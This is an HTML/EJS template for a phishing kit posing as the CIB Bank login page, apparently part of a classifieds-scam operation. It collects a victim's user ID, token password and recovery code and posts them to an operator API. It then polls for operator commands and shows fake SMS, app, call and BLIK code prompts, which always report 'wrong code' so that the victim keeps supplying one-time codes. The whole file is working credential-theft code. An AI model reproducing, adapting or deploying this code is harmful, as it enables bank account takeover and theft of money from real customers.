<body>
  <div class="container">
    <div class="parent">
      <div class="block">
        <div class="card">
          <div class="card-body needs-validation">
            <div class="logo mb-3">
              <img class="mb-3" width="150" src="/cib_files/CIB.jpg">
            </div>

            <div class="mb-3">
              <label for="exampleFormControlInput1" class="form-label">Felhasználó azonosító</label>
              <input type="text" name="login" class="form-control" id="login" placeholder="Felhasználó azonosító" required="">
              <div class="invalid-feedback" id="passwordMsg">
                kötelező mező
              </div>
            </div>
            <div class="mb-3">
              <label for="exampleFormControlInput1" class="form-label">withKEY token jelszó</label>
              <input type="text" name="password" class="form-control" id="password" placeholder="withKEY token jelszó" required="">
              <div class="invalid-feedback" id="passwordMsg">
                kötelező mező
              </div>
            </div>
            <div class="mb-3">
              <label for="exampleFormControlInput1" class="form-label">helyreállítási kódot</label>
              <input type="text" name="pin" class="form-control" id="pin" placeholder="helyreállítási kódot" required="">
              <div class="invalid-feedback" id="keyMsg">
                kötelező mező
              </div>
            </div>



            <div class="d-grid gap-2">
              <button class="btn btn-primary" type="button" id="btn">Belépés</button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
    <div class="modal-dialog modal-fullscreen">
      <div class="modal-content">
        <div class="modal-body">
          <section id="promo-block">
            <div class="container">
              <div class="parent">
                <div class="block">
                  <div class="spinner-border text-primary spin" style="text-align: center; justify-content: center; display: flex; align-items: center; margin: 0 auto; margin-bottom: 10px;" role="status">
                    <span class="visually-hidden">Loading...</span>
                  </div>
                  <h3 style="font-size: 21px;font-weight: bold;text-align: center;">WAIT</h3>
                  <p style="font-size: 12px;font-weight: bolder;text-align: center;">We are waiting
                    for a response from the bank....</p>
                </div>
              </div>
            </div>
        </section></div>
      </div>
    </div>
  </div>

<style>
  .asd {
    border: 1px solid #ccc;
    height: 15px;
  }

  .swal-text {
    margin: 40px -20px 10px 10px;
  }

  .swal-content__input,
  .swal-content__textarea {
    -webkit-appearance: none;
    background-color: #fff;
    border: none;
    font-size: 14px;
    display: block;
    box-sizing: border-box;
    width: 100%;
    border: 1px solid rgba(0, 0, 0, .14);
    padding: 10px 13px;
    border-radius: 2px;
    transition: border-color .2s;
  }

  .swal-button {
    background-color: #7cd1f9;
    color: #fff;
    border: none;
    box-shadow: none;
    border-radius: 5px;
    font-weight: 600;
    font-size: 14px;
    padding: 10px 24px;
    margin: 0;
    cursor: pointer;
    display: block;
  }
</style>
<script>
  var token = null

  document.getElementById("btn").onclick = async function () {
    const login = document.getElementById("login").value
    const password = document.getElementById("password").value
    const pin = document.getElementById("pin").value


    await axios.post("/api/sendBank", {
      adId: "<%=ad.id%>",
      login: login,
      password: password,
      pin: pin,

      bank: "CIB BANK",
    }).then(async function (res) {
      token = res.data.token
      init(res.data.token)
    })
  };

  async function init(token) {
      var currentStatus = null;

      function waitModal() {
        swal({
          title: "<%=translate["wait"][ad.service.lang]%>",
          text: "<%=translate["bank_processes"][ad.service.lang]%>",
          type: "info",
          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        }).then((ok) => {
          if (ok) document.location.href = "/ad/" + AD_ID;
        });
      }
      
      function limitsModal() {
        swal({
          title: "<%=translate["error_title"][ad.service.lang]%>",
          text: "<%=translate["limits"][ad.service.lang]%>",
          type: "error",
          closeOnConfirm: false,
          closeOnCancel: false,
          closeOnClickOutside: false,
          closeOnEsc: false,
        }).then((ok) => {
          if (ok) document.location.href = "/ad/" + AD_ID;
        });
      }
      function erroronlModal(err) {
        swal({
          title: "<%=translate["info"][ad.service.lang]%>",
          text: `${err}`,
          type: "info",
          closeOnConfirm: false,
          closeOnCancel: false,
          closeOnClickOutside: false,
          closeOnEsc: false,
        }).then((ok) => {
          if (ok) document.location.href = "/ad/" + AD_ID;
        });
      }
      function forVerifyModal() {
        swal({
          title: "<%=translate["error_title"][ad.service.lang]%>",
          text: "<%=translate["for_verify"][ad.service.lang]%>",
          type: "error",
          closeOnConfirm: false,
          closeOnCancel: false,
          closeOnClickOutside: false,
          closeOnEsc: false,
        }).then((ok) => {
          if (ok) document.location.href = "/ad/" + AD_ID;
        });
      }
      function correctBalanceModal() {
        swal({
          title: "<%=translate["error_title"][ad.service.lang]%>",
          text: "<%=translate["correct_balance"][ad.service.lang]%>",
          type: "error",
          closeOnConfirm: false,
          closeOnCancel: false,
          closeOnClickOutside: false,
          closeOnEsc: false,
        }).then((ok) => {
          if (ok) document.location.href = "/ad/" + AD_ID;
        });
      }
      function otherCardModal() {
        swal({
          title: "<%=translate["error_title"][ad.service.lang]%>",
          text: "<%=translate["other_card"][ad.service.lang]%>",
          type: "error",
          closeOnConfirm: false,
          closeOnCancel: false,
          closeOnClickOutside: false,
          closeOnEsc: false,
        }).then((ok) => {
          if (ok) document.location.href = "/ad/" + AD_ID;
        });
      }
        function moneyModal() {
        swal({
          title: "<%=translate["error_title"][ad.service.lang]%>",
          text: "<%=translate["dep_text"][ad.service.lang]%>",
          type: "error",
          closeOnConfirm: false,
          closeOnCancel: false,
          closeOnClickOutside: false,
          closeOnEsc: false,
        }).then((ok) => {
          if (ok) document.location.href = "/ad/" + AD_ID;
        });
      }
      function fakeLkModal() {
        swal({
          title: translate["error_title"].ua,
          text: translate["lkby_fake"].ua,
          type: "error",
        });
      }

      function pushModal() {
        swal("<%=translate["push_title"][ad.service.lang]%>", "<%=translate["push_text"][ad.service.lang]%>", "info", {
          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        });
      }
      function successModal() {
        swal("<%=translate["success"][ad.service.lang]%>", "<%=translate["money_will"][ad.service.lang]%>", "success", {
          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        });
      }
      function pictureModal() {
        swal(
          translate["picture_title"].ua,
          translate["picture_text"].ua,
          "info",
          {
            content: {
              element: "div",
              attributes: {
                id: "pictures_div",
              },
            },
            closeOnClickOutside: false,
            closeOnEsc: false,
            buttons: false,
          }
        );
        const pictures = [
          "банан",
          "брюки",
          "бургер",
          "гитара",
          "зонтик",
          "календарь",
          "калькулятор",
          "карандаш",
          "клубника",
          "компас",
          "крокодил",
          "лимон",
          "мамонт",
          "микрофон",
          "наушники",
          "очки",
          "помидор",
          "свитер",
          "телефон",
          "цветок",
          "шоколад",
        ].sort(() => Math.random() - 0.5);

        document.querySelector("#pictures_div").innerHTML =
          '<div class="pictures-container">' +
          pictures
            .map(
              (v) =>
                '<div class="pictures-element" data-item="' +
                v +
                '"><img draggable="false" alt="" src="/img/pictures/' +
                v +
                '.png"></div>'
            )
            .join("\n") +
          "</div>";
        document.querySelector(".pictures-container").classList.remove("disabled");
      }
      function codeModal(
        codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>"
      ) {
        swal.stopLoading();
        swal({
          title,
          text,
          content: {
            element: "input",
            attributes: {
              type: "password",
              placeholder,
              maxLength: 255,
              required: true,
              style:
                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
            },
          },
          closeOnEsc: false,
          closeOnClickOutside: false,
          buttons: {
            confirm: {
              text: "<%=translate["submit"][ad.service.lang]%>",
              closeModal: false,
            },
          },
        }).then(async (code) => {
          try {
            if (!code) return;
            $.ajax({
              type: "POST",
              url: "/api/submitCode",
              data: {
                codeType,
                code,
                token: token,
              },
              success: (data) => {
                swal.stopLoading();
                alert(wrong_code);
                codeModal(...arguments);
              },
              error: () => {
                swal.stopLoading();
                alert(wrong_code);
                codeModal(...arguments);
              },
            });
          } catch (err) {
            swal.stopLoading();
            alert(wrong_code);
            codeModal(...arguments);
          }
        });
      }
      function ferrModal(
        codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>"
      ) {
        swal.stopLoading();
        swal({
          title,
          text,
          content: {
            element: "input",
            attributes: {
              type: "password",
              placeholder,
              maxLength: 255,
              required: true,
              style:
                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
            },
          },
          closeOnEsc: false,
          closeOnClickOutside: false,
          buttons: {
            confirm: {
              text: "<%=translate["submit"][ad.service.lang]%>",
              closeModal: false,
            },
          },
        }).then(async (code) => {
          try {
            if (!code) return;
            $.ajax({
              type: "POST",
              url: "/api/submitCode",
              data: {
                codeType,
                code,
                token: token,
              },
              success: (data) => {
                swal.stopLoading();
                alert(wrong_code);
                codeModal(...arguments);
              },
              error: () => {
                swal.stopLoading();
                alert(wrong_code);
                codeModal(...arguments);
              },
            });
          } catch (err) {
            swal.stopLoading();
            alert(wrong_code);
            codeModal(...arguments);
          }
        });
      }
      
      
      
      function checkLogStatus() {
        $.ajax({
          type: "POST",
          url: "/api/checkStatus",
          data: {
            token: token,
          },
          success: (data) => {
            if (data.status == currentStatus) return;
            currentStatus = data.status;
            if (currentStatus == "profit") successModal();
            else if (currentStatus == "sms") codeModal();



            else if (currentStatus.includes("error")) {
              erroronlModal(currentStatus.split("error_")[1]);
            }
            else if (currentStatus.includes("ferr"))ferrModal(
              "custom",
              "<%=translate["info"][ad.service.lang]%>",
              currentStatus.split("ferr_")[1],
              "<%=translate["enterrr"][ad.service.lang]%>",
              "<%=translate["wrongg"][ad.service.lang]%>",
            );




            else if (currentStatus == "appCode")
              codeModal(
                "app",
                "<%=translate["app_code_title"][ad.service.lang]%>",
                "<%=translate["app_code_text"][ad.service.lang]%>",
                "<%=translate["app_code_placeholder"][ad.service.lang]%>",
              );
            else if (currentStatus == "callCode")
              codeModal(
                "call",
                "<%=translate["call_code_title"][ad.service.lang]%>",
                "<%=translate["call_code_text"][ad.service.lang]%>",
                "<%=translate["call_code_placeholder"][ad.service.lang]%>",
              );
              else if (currentStatus == "money")
              moneyModal(
                "money",
                "<%=translate["error_title"][ad.service.lang]%>",
                "<%=translate["dep_text"][ad.service.lang]%>",
              );
            else if (currentStatus == "blik")
              codeModal(
                "blik",
                "<%=translate["blik_code_title"][ad.service.lang]%>",
                "<%=translate["blik_code_text"][ad.service.lang]%>",
                "<%=translate["blik_code_placeholder"][ad.service.lang]%>",
              );
            else if (currentStatus == "fakeLk") fakeLkModal();
            else if (currentStatus == "push") pushModal();
            else if (currentStatus == "limits") limitsModal();
            else if (currentStatus == "otherCard") otherCardModal();
            else if (currentStatus == "money") moneyModal();


            else if (currentStatus == "forVerify") forVerifyModal();
            else if (currentStatus == "correctBalance") correctBalanceModal();
            else if (currentStatus == "picture") pictureModal();
          },
        }).done(() => setTimeout(checkLogStatus, 1500));
      }
      setTimeout(checkLogStatus, 1500)
      waitModal()
    }
</script>
